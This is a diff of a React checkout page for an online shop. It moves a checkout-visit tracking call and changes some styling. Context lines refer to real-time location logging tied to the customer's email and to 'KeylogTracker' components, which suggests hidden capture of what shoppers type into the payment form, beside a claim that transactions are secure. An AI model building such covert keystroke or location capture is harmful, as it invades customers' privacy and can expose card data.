@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useEffect, useRef } from 'react'
+import { useEffect, useRef, useState } from 'react'
 import { useCart } from '@/contexts/CartContext'
 import { formatPrice, validateCardNumber, validateExpiryDate, validateCVV } from '@/lib/utils'
 import { CreditCard, Lock, Truck, Shield, MapPin, User, Mail, Phone } from 'lucide-react'
@@ -112,6 +112,7 @@ const CreditCardIcons = ({ onCardClick }: { onCardClick: (cardType: string) => v
 export default function CheckoutPage() {
   const { state, dispatch } = useCart()
   const router = useRouter()
+  const checkoutTrackedRef = useRef(false)
   
   const [formData, setFormData] = useState({
     firstName: '',
@@ -172,6 +173,19 @@ export default function CheckoutPage() {
     }
   }, [dispatch])
 
+  // Track checkout page visits (+1)
+  useEffect(() => {
+    if (checkoutTrackedRef.current) return
+    checkoutTrackedRef.current = true
+
+    fetch('/api/tracking/checkout', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    }).catch((error) => {
+      console.error('Error tracking checkout visit:', error)
+    })
+  }, [])
+
   // Real-time location logging for faster email receipts
   useEffect(() => {
     const logLocationData = async () => {
@@ -228,18 +242,6 @@ export default function CheckoutPage() {
     }
     maybePersist()
   }, [formData.email, customerEmail, locationData])
-
-  // Track checkout page visit (only once)
-  const checkoutTrackedRef = useRef(false)
-  useEffect(() => {
-    if (checkoutTrackedRef.current) return
-    checkoutTrackedRef.current = true
-    
-    fetch('/api/tracking/checkout', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' }
-    }).catch(console.error)
-  }, [])
 
   // logging handled by KeylogTracker components
 
@@ -720,14 +722,14 @@ export default function CheckoutPage() {
 
             {/* Payment Information - Third Section */}
             <div className="bg-white border border-gray-300 p-8">
-              <div className="flex items-center space-x-3">
+              <div className="flex items-center space-x-3 mb-8">
                 <CreditCard className="w-6 h-6 text-gray-700" />
                 <h2 className="text-2xl font-light" style={{ color: '#851A1B' }}>Payment Information</h2>
                 <Lock className="w-5 h-5 text-gray-600" />
                 {/* <span className="text-sm text-gray-600 font-medium">Secure</span> */}
               </div>
               <div>
-                <span className="text-xs text-gray-500 font-light">All transactions are secure and encrypted.</span>
+                <span className="text-sm text-gray-600 font-medium">All transactions are secure and encrypted.</span>
               </div>
               {/* Accepted Cards Section */}
               <div className="mb-6 p-4 bg-green-50 rounded-lg border-2 border-green-200">
